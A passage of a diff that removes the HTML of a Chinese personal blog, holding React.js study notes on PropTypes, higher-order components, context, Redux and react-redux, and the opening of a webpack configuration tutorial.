class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>propTypes 指定了参数类型，但是并没有说这个参数一定要传入，事实上，这些参数默认都是可选的。可选参数可以通过配置 defaultProps，让它在不传入的时候有默认值。<br>但是这里并没有配置 defaultProps，所以如果直接用&lt;Comment /&gt; 而不传入任何参数的话，comment 就会是 undefined，<br>可以通过 isRequired 关键字来强制组件某个参数必须传入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">static propTypes = &#123;</div><div class="line">  comment: PropTypes.object.isRequired</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>React.js 提供的 PropTypes 提供了一系列的数据类型可以用来配置组件的参数：<br>PropTypes.array<br>PropTypes.bool<br>PropTypes.func<br>PropTypes.number<br>PropTypes.object<br>PropTypes.string<br>PropTypes.node<br>PropTypes.element</p>
-<p><a href="https://reactjs.org/docs/typechecking-with-proptypes.html" target="_blank" rel="external">官方文档</a></p>
-<h1 id="建议命名和定义顺序"><a href="#建议命名和定义顺序" class="headerlink" title="建议命名和定义顺序"></a>建议命名和定义顺序</h1><p>组件的私有方法都用 _ 开头<br>所有事件监听的方法都用 handle 开头<br>把事件监听方法传给组件的时候，属性名用 on 开头</p>
-<p>组件的内容编写顺序如下：</p>
-<p>static 开头的类属性，如 defaultProps、propTypes。<br>构造函数，constructor。<br>getter/setter。<br>组件生命周期。<br>_ 开头的私有方法。<br>事件监听方法，handle<em>。<br>render</em>开头的方法，有时候 render() 方法里面的内容会分开到不同函数里面进行，这些函数都以 render* 开头。<br>render() 方法。</p>
-<h1 id="高阶组件"><a href="#高阶组件" class="headerlink" title="高阶组件"></a>高阶组件</h1><p>高阶组件就是一个函数，传给它一个组件，它返回一个新的组件,返回的这个新的组件使用传入的组件作为子组件。</p>
-<p>高阶组件内部的包装组件和被包装组件之间通过 props 传递数据。</p>
-<p>多层高阶组件使用时，this.props是从外向里传递的，即A组件先后被B,C,D组件组装，则this.props到达A组件的顺序是D,C,B,A</p>
-<p>高阶组件的作用是用于代码复用，可以把组件之间可复用的代码、逻辑抽离到高阶组件当中。</p>
-<p>高阶组件有助于提高我们代码的灵活性，逻辑的复用性。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">//高阶组件wrapWithLoadData ,</div><div class="line">import React, &#123; Component &#125; from &apos;react&apos;</div><div class="line"></div><div class="line">export default (WrappedComponent, name) =&gt; &#123;</div><div class="line">  class NewComponent extends Component &#123;</div><div class="line">    constructor () &#123;</div><div class="line">      super()</div><div class="line">      this.state = &#123; data: null &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    componentWillMount () &#123;</div><div class="line">      let data = localStorage.getItem(name)  //如果改变数据获取方式,可以修改这里</div><div class="line">      this.setState(&#123; data &#125;)</div><div class="line">    &#125;</div><div class="line">    //在此之前，可以做很多自定义逻辑</div><div class="line">    render () &#123;</div><div class="line">      return &lt;WrappedComponent data=&#123;this.state.data&#125; /&gt;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  return NewComponent</div><div class="line">&#125;</div><div class="line"></div><div class="line">//使用</div><div class="line">import wrapWithLoadData from &apos;./wrapWithLoadData&apos;</div><div class="line"></div><div class="line">class InputWithUserName extends Component &#123;</div><div class="line">  render () &#123;</div><div class="line">    return &lt;input value=&#123;this.props.data&#125; /&gt;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">InputWithUserName = wrapWithLoadData(InputWithUserName, &apos;username&apos;) //组件InputWithUserName以参数传入wrapWithLoadData，进行包装</div><div class="line">export default InputWithUserName</div></pre></td></tr></table></figure>
-<h1 id="context"><a href="#context" class="headerlink" title="context"></a>context</h1><p>一个组件可以通过 getChildContext 方法返回一个对象，这个对象就是子树的 context，提供 context 的组件必须提供 childContextTypes 作为 context 的声明和验证。</p>
-<p>如果一个组件设置了 context，那么它的子组件都可以直接访问到里面的内容，它就像这个组件为根的子树的全局变量。任意深度的子组件都可以通过 contextTypes 来声明你想要的 context 里面的哪些状态，然后可以通过 this.context 访问到那些状态。</p>
-<p>context 打破了组件和组件之间通过 props 传递数据的规范，极大地增强了组件之间的耦合性。而且，就如全局变量一样，context 里面的数据能被随意接触就能被随意修改，每个组件都能够改 context 里面的内容会导致程序的运行不可预料。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">//组件树的根组件</div><div class="line">class Index extends Component &#123;</div><div class="line">  static childContextTypes = &#123; //验证getChildContext 返回的对象  必写!!!</div><div class="line">    themeColor: PropTypes.string</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  constructor () &#123;</div><div class="line">    super()</div><div class="line">    this.state = &#123; themeColor: &apos;red&apos; &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  getChildContext () &#123; //设置 context,返回的对象就是子组件的this.context</div><div class="line">    return &#123; themeColor: this.state.themeColor &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  render () &#123;</div><div class="line">    return (</div><div class="line">      &lt;div&gt;</div><div class="line">        &lt;Header /&gt;</div><div class="line">        &lt;Main /&gt;</div><div class="line">      &lt;/div&gt;</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">//其中一层的子组件</div><div class="line">class Title extends Component &#123;</div><div class="line">  static contextTypes = &#123; //来声明和验证需要获取的contxt内容的类型 必写!!!</div><div class="line">    themeColor: PropTypes.string</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  render () &#123;</div><div class="line">    return (</div><div class="line">      &lt;h1 style=&#123;&#123; color: this.context.themeColor &#125;&#125;&gt;React.js 小书标题&lt;/h1&gt; //直接使用this.context里面的值</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h1 id="redux-模式"><a href="#redux-模式" class="headerlink" title="redux 模式"></a>redux 模式</h1><p>代码中发现了共享的状态如果可以被任意修改的话，那么程序的行为将非常不可预料，所以提高了修改数据的门槛：必须通过 dispatch 执行某些允许的修改操作，而且必须大张旗鼓的在 action 里面声明。</p>
-<p>这种模式挺好用的，就把它抽象出来一个 createStore，它可以产生 store，里面包含 getState 和 dispatch 函数，方便使用。</p>
-<p>后来发现每次修改数据都需要手动重新渲染非常麻烦，因此希望自动重新渲染视图。所以后来加入了订阅者模式，可以通过 store.subscribe 订阅数据修改事件，每次数据更新的时候自动重新渲染视图。</p>
-<p>接下来发现了原来的“重新渲染视图”有比较严重的性能问题（没有发生改变的数据也进行了渲染），我们引入了“共享结构的对象”来帮我们解决问题，这样就可以在每个渲染函数的开头进行简单的判断避免没有被修改过的数据重新渲染。</p>
-<p>我们优化了 stateChanger 为 reducer，定义了 reducer 只能是纯函数，功能就是负责初始 state，和根据 state 和 action 计算具有共享结构的新的 state。</p>
-<p>createStore 现在可以直接拿来用了，套路就是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">function createStore (reducer) &#123;</div><div class="line">  let state = null</div><div class="line">  const listeners = []</div><div class="line">  const subscribe = (listener) =&gt; listeners.push(listener)</div><div class="line">  const getState = () =&gt; state</div><div class="line">  const dispatch = (action) =&gt; &#123;</div><div class="line">    state = reducer(state, action) // 覆盖原对象</div><div class="line">    listeners.forEach((listener) =&gt; listener())</div><div class="line">  &#125;</div><div class="line">  dispatch(&#123;&#125;) // 初始化 state</div><div class="line">  return &#123; getState, dispatch, subscribe &#125;</div><div class="line">&#125;</div><div class="line">// 定一个 reducer</div><div class="line">function reducer (state, action) &#123;</div><div class="line">  /* 初始化 state 和 switch case */</div><div class="line">&#125;</div><div class="line"></div><div class="line">// 生成 store</div><div class="line">const store = createStore(reducer)</div><div class="line"></div><div class="line">// 监听数据变化重新渲染页面</div><div class="line">store.subscribe(() =&gt; renderApp(store.getState()))</div><div class="line"></div><div class="line">// 首次渲染页面</div><div class="line">renderApp(store.getState())</div><div class="line"></div><div class="line">// 后面可以随意 dispatch 了，页面自动更新</div><div class="line">store.dispatch(...)</div></pre></td></tr></table></figure></p>
-<p>例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line">function createStore (reducer) &#123;</div><div class="line">  let state = null</div><div class="line">  const listeners = []</div><div class="line">  const subscribe = (listener) =&gt; listeners.push(listener)</div><div class="line">  const getState = () =&gt; state</div><div class="line">  const dispatch = (action) =&gt; &#123;</div><div class="line">    state = reducer(state, action) // 覆盖原对象</div><div class="line">    listeners.forEach((listener) =&gt; listener())</div><div class="line">  &#125;</div><div class="line">  dispatch(&#123;&#125;) // 初始化 state</div><div class="line">  return &#123; getState, dispatch, subscribe &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function renderApp (newAppState, oldAppState = &#123;&#125;) &#123; // 防止 oldAppState 没有传入，所以加了默认参数 oldAppState = &#123;&#125;</div><div class="line">  if (newAppState === oldAppState) return // 数据没有变化就不渲染了</div><div class="line">  console.log(&apos;render app...&apos;)</div><div class="line">  renderTitle(newAppState.title, oldAppState.title)</div><div class="line">  renderContent(newAppState.content, oldAppState.content)</div><div class="line">&#125;</div><div class="line"></div><div class="line">function renderTitle (newTitle, oldTitle = &#123;&#125;) &#123;</div><div class="line">  if (newTitle === oldTitle) return // 数据没有变化就不渲染了</div><div class="line">  console.log(&apos;render title...&apos;)</div><div class="line">  const titleDOM = document.getElementById(&apos;title&apos;)</div><div class="line">  titleDOM.innerHTML = newTitle.text</div><div class="line">  titleDOM.style.color = newTitle.color</div><div class="line">&#125;</div><div class="line"></div><div class="line">function renderContent (newContent, oldContent = &#123;&#125;) &#123;</div><div class="line">  if (newContent === oldContent) return // 数据没有变化就不渲染了</div><div class="line">  console.log(&apos;render content...&apos;)</div><div class="line">  const contentDOM = document.getElementById(&apos;content&apos;)</div><div class="line">  contentDOM.innerHTML = newContent.text</div><div class="line">  contentDOM.style.color = newContent.color</div><div class="line">&#125;</div><div class="line"></div><div class="line">function stateChanger (state, action) &#123;</div><div class="line">   if (!state) &#123;</div><div class="line">    return &#123;</div><div class="line">      title: &#123;</div><div class="line">        text: &apos;React.js lalalal&apos;,</div><div class="line">        color: &apos;red&apos;,</div><div class="line">      &#125;,</div><div class="line">      content: &#123;</div><div class="line">        text: &apos;React.js content&apos;,</div><div class="line">        color: &apos;blue&apos;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  switch (action.type) &#123;</div><div class="line">    case &apos;UPDATE_TITLE_TEXT&apos;:</div><div class="line">      return &#123; // 构建新的对象并且返回</div><div class="line">        ...state,</div><div class="line">        title: &#123;</div><div class="line">          ...state.title,</div><div class="line">          text: action.text</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">    case &apos;UPDATE_TITLE_COLOR&apos;:</div><div class="line">      return &#123; // 构建新的对象并且返回</div><div class="line">        ...state,</div><div class="line">        title: &#123;</div><div class="line">          ...state.title,</div><div class="line">          color: action.color</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">    default:</div><div class="line">      return state // 没有修改，返回原来的对象</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">const store = createStore(stateChanger)</div><div class="line">let oldState = store.getState() // 缓存旧的 state</div><div class="line">store.subscribe(() =&gt; &#123;</div><div class="line">  const newState = store.getState() // 数据可能变化，获取新的 state</div><div class="line">  renderApp(newState, oldState) // 把新旧的 state 传进去渲染</div><div class="line">  oldState = newState // 渲染完以后，新的 newState 变成了旧的 oldState，等待下一次数据变化重新渲染</div><div class="line">&#125;)</div><div class="line"></div><div class="line">renderApp(store.getState()) // 首次渲染页面</div><div class="line">store.dispatch(&#123; type: &apos;UPDATE_TITLE_TEXT&apos;, text: &apos;《React.js is so cool!》&apos; &#125;) // 修改标题文本</div><div class="line">store.dispatch(&#123; type: &apos;UPDATE_TITLE_COLOR&apos;, color: &apos;blue&apos; &#125;) // 修改标题颜色</div></pre></td></tr></table></figure></p>
-<h1 id="react-redux"><a href="#react-redux" class="headerlink" title="react-redux"></a>react-redux</h1><p>使用Context和redux实现根据共享状态进行子组件渲染的工作</p>
-<p><a href="https://github.com/YooHannah/make-react-redux/blob/master/src/index.js" target="_blank" rel="external">index.js</a></p>
-<p><a href="https://github.com/YooHannah/make-react-redux/blob/master/src/react-redux.js" target="_blank" rel="external">react-redux.js</a></p>
-<p><a href="https://github.com/YooHannah/make-react-redux/blob/master/src/ThemeSwitch.js" target="_blank" rel="external">ThemeSwitch.js</a></p>
-<p><a href="https://github.com/YooHannah/make-react-redux/blob/master/src/Content.js" target="_blank" rel="external">Content.js</a></p>
-<p><a href="https://github.com/YooHannah/make-react-redux/blob/master/src/Header.js" target="_blank" rel="external">Header.js</a></p>
-<p>使用真正的react-redux<br>即<br>import { connect } from ‘react-redux’<br>import { createStore } from ‘redux’<br>import { Provider } from ‘react-redux’</p>
-<p>根据是否需要高度的复用性，把组件划分为 Dumb 和 Smart 组件，约定俗成地把它们分别放到 components 和 containers 目录下。</p>
-<p>Dumb 基本只做一件事情 —— 根据 props 进行渲染。而 Smart 则是负责应用的逻辑、数据，把所有相关的 Dumb（Smart）组件组合起来，通过 props 控制它们。</p>
-<p>Smart 组件可以使用 Smart、Dumb 组件；而 Dumb 组件最好只使用 Dumb 组件，否则它的复用性就会丧失。</p>
-<p>要根据应用场景不同划分组件，如果一个组件并不需要太强的复用性，直接让它成为 Smart 即可；否则就让它成为 Dumb 组件。</p>
-<p>还有一点要注意，Smart 组件并不意味着完全不能复用，Smart 组件的复用性是依赖场景的，在特定的应用场景下是当然是可以复用 Smart 的。而 Dumb 则是可以跨应用场景复用，Smart 和 Dumb 都可以复用，只是程度、场景不一样。</p>
-<p>例如将ThemeSwitch拆分成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line">/* src/components/ThemeSwitch.js */</div><div class="line">import React, &#123; Component, PropTypes &#125; from &apos;react&apos;</div><div class="line"></div><div class="line">export default class ThemeSwitch extends Component &#123;</div><div class="line">  static propTypes = &#123;</div><div class="line">    themeColor: PropTypes.string,</div><div class="line">    onSwitchColor: PropTypes.func</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  handleSwitchColor (color) &#123;</div><div class="line">    if (this.props.onSwitchColor) &#123;</div><div class="line">      this.props.onSwitchColor(color)</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  render () &#123;</div><div class="line">    return (</div><div class="line">      &lt;div&gt;</div><div class="line">        &lt;button</div><div class="line">          style=&#123;&#123; color: this.props.themeColor &#125;&#125;</div><div class="line">          onClick=&#123;this.handleSwitchColor.bind(this, &apos;red&apos;)&#125;&gt;Red&lt;/button&gt;</div><div class="line">        &lt;button</div><div class="line">          style=&#123;&#123; color: this.props.themeColor &#125;&#125;</div><div class="line">          onClick=&#123;this.handleSwitchColor.bind(this, &apos;blue&apos;)&#125;&gt;Blue&lt;/button&gt;</div><div class="line">      &lt;/div&gt;</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">/* src/containers/ThemeSwitch.js */</div><div class="line"></div><div class="line">import &#123; connect &#125; from &apos;react-redux&apos;</div><div class="line">import ThemeSwitch from &apos;../components/ThemeSwitch&apos;</div><div class="line"></div><div class="line">const mapStateToProps = (state) =&gt; &#123;</div><div class="line">  return &#123;</div><div class="line">    themeColor: state.themeColor</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">const mapDispatchToProps = (dispatch) =&gt; &#123;</div><div class="line">  return &#123;</div><div class="line">    onSwitchColor: (color) =&gt; &#123;</div><div class="line">      dispatch(&#123; type: &apos;CHANGE_COLOR&apos;, themeColor: color &#125;)</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">export default connect(mapStateToProps, mapDispatchToProps)(ThemeSwitch)</div></pre></td></tr></table></figure></p>
-<p><a href="http://huziketang.com/books/react/lesson1" target="_blank" rel="external">学习资料链接</a></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/performance/webpack.html">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="YooHannah">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="/psb.jpg">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="My Little World">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="My Little World" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/post/performance/webpack.html" itemprop="url">
-                  关于webpack
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-10-08T18:37:02+08:00">
-                2017-10-08
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><p>1.webpack工作内容<br>Webpack可以看做是模块打包机：它做的事情是，分析你的项目结构，找到JavaScript模块以及其它的一些浏览器不能直接运行的拓展语言（Scss，TypeScript等），并将其转换和打包为合适的格式供浏览器使用。<br>2.webpack工作方式<br>把你的项目当做一个整体，通过一个给定的主文件（如：index.js），Webpack将从这个文件开始找到你的项目的所有依赖文件，使用loaders,plugins处理它们，最后打包为一个（或多个）浏览器可识别的JavaScript文件。</p>
-<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>1.如果在nodejs中全局安装了webpack和webpack-dev-server,可以在git bash直接使用’webpack’命令进行打包，使用’webpack-dev-server’命令启动打包后生成的项目<br>2.在打包之前,要先配置webpack.config.js文件,’webpack’命令会根据webpack.config.js文件的配置项去打包文件<br>3.如果想使用不同的配置文件去打包项目，可以使用’webpack –config 文件名’命令去打包<br>4.如果不想带文件名去打包,可以在package.json的scripts对象中配置命令‘xxx’,然后在git bash中使用命令‘npm run xxx’进行打包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&quot;scripts&quot;: &#123;</div><div class="line">    &quot;start&quot;: &quot;webpack-dev-server&quot;,</div><div class="line">    &quot;build&quot;: &quot;webpack --config webpack.config.build.js&quot;,</div><div class="line">    &quot;dev&quot;:&quot;webpack --config webpack.config.dev.js&quot;</div><div class="line">  &#125;</div></pre></td></tr></table></figure></p>
-<p>执行 npm run build 则按照webpack.config.build.js文件配置的内容去打包<br>同样，执行 npm run dev 则按照webpack.config.dev.js文件配置的内容去打包<br>但要注意,使用配置命令’start’时，直接执行’npm start’，就可以执行其对于的命令，中间不需要加run</p>
-<h1 id="webpack-config-js-配置"><a href="#webpack-config-js-配置" class="headerlink" title="webpack.config.js 配置"></a>webpack.config.js 配置</h1><p>module.exports = {}<br>1.配置根路径<br>配置入口文件前，可以用context配置根路径，这样在配置时，就不用将文件路径写进去，直接将文件配置进去就可以了<br>可以借助path模块拼接路径字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">const path = require(&apos;path&apos;)</div><div class="line"></div><div class="line">module.exports = &#123;</div><div class="line">  /**</div><div class="line">   * The base directory</div><div class="line">   */</div><div class="line">  context: path.join(__dirname, &apos;./src&apos;),//这样入口文件就是指src文件夹下面的那些文件</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>2.入口文件<br>入口文件是指打包后项目生成的可以访问的文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">//单入口：</div><div class="line"> entry: &apos;./index.js&apos;,/*打包单个文件*/</div><div class="line"> entry: [&apos;./index1.js&apos;,&apos;./index2.js&apos;],/*打包多个文件*/</div><div class="line"></div><div class="line">//多入口：</div><div class="line">entry: &#123;</div><div class="line">    home: &apos;./home&apos;,</div><div class="line">    user: [&apos;./user&apos;, &apos;./account&apos;]</div><div class="line">  &#125;,</div></pre></td></tr></table></figure></p>
-<p>多入口文件数组的KEY值可用于命名输出文件名，其对应的值即是要打包的源文件</p>
-<p>3.输出文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">output: &#123;</div><div class="line"></div><div class="line">/* filename方式一：直接指定文件名*/</div><div class="line">    filename: &apos;bundle.js&apos;,</div><div class="line"></div><div class="line">/* filename方式二：映射变量[name]和[hash]，[name]即定义入口文件的key值，[hash]是webpack在打包的时候按照一定规则生成的值,是MD5加密的值,如果文件没有发生变化，hash值不会变,可用于版本控制</div><div class="line">(CDN一般缓存时间比较长，文件发生变化，hash值就会变，文件名就会变，CDN就能及时更新文件)</div><div class="line"> * 还可以加[chunkhash],这里是作为版本号使用，方便上线时静态资源的版本管理</div><div class="line"> * 单入口[name]被映射成‘main’</div><div class="line">*/</div><div class="line">    filename: &apos;[name].bundle.[hash].js&apos;,</div><div class="line"></div><div class="line">    path: &apos;/home/proj/public/assets&apos;，/*指定输入文件存放路径*/</div><div class="line">    libraryTarget：</div><div class="line">  &#125;</div></pre></td></tr></table></figure></p>
-<p><a href="http://www.css88.com/doc/webpack2/concepts/output/" target="_blank" rel="external">其他配置参数</a></p>
-<p>4.配置加载器loader</p>
-<p>loader 是对应用程序中资源文件进行转换。它们是（运行在 Node.js 中的）函数，可以将资源文件作为参数的来源，然后返回新的资源文件。<br><a href="https://webpack.js.org/loaders/" target="_blank" rel="external">官方可用loader</a></p>
-<p>Loaders的配置包括以下几方面：<br>test：一个用以匹配loaders所处理文件的拓展名的正则表达式（必须）<br>loader：loader的名称（必须）<br>include/exclude:手动添加必须处理的文件（文件夹）或屏蔽不需要处理的文件（文件夹）（可选）；<br>query：为loaders提供额外的设置选项（可选）</p>
-<p>loader被配置在rules数组中，数组每一个对象可配置一个或多个loader<br>例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">module: &#123;</div><div class="line">   rules: [</div><div class="line">     &#123;</div><div class="line">       test: /\.js$/,</div><div class="line">       include: path.join(__dirname, &apos;./src&apos;),</div><div class="line">       use: &apos;babel-loader&apos;</div><div class="line">     &#125;</div><div class="line">   ]</div><div class="line"> &#125;,</div></pre></td></tr></table></figure></p>
-<p>常用loader:<br>babel-loader:编译js,考虑到babel具有非常多的配置选项,一般把babel的配置选项放在一个单独的名为 “.babelrc” 的配置文件中<br>css-loader:使你能够使用类似@import 和 url(…)的方法实现 require()的功能,获取css文件里面的样式<br>style-loader:将css样式插件js文件，与css-loader一起使用能够把样式表嵌入webpack打包后的JS文件中<br>autoprefixer-loader:自动添加前缀，使css文件更有兼容性<br>postcss-loader:css会自动根据Can i use里的数据添加不同前缀，可与autoprefixer-loader结合使用<br>ExtractTextPlugin.extract:将css单独打包成一个.css文件，使用这个插件，需要require 插件extract-text-webpack-plugin<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">//配置代码：</div><div class="line">1.</div><div class="line"> module: &#123;</div><div class="line">    rules: [</div><div class="line">      &#123;</div><div class="line">        test: 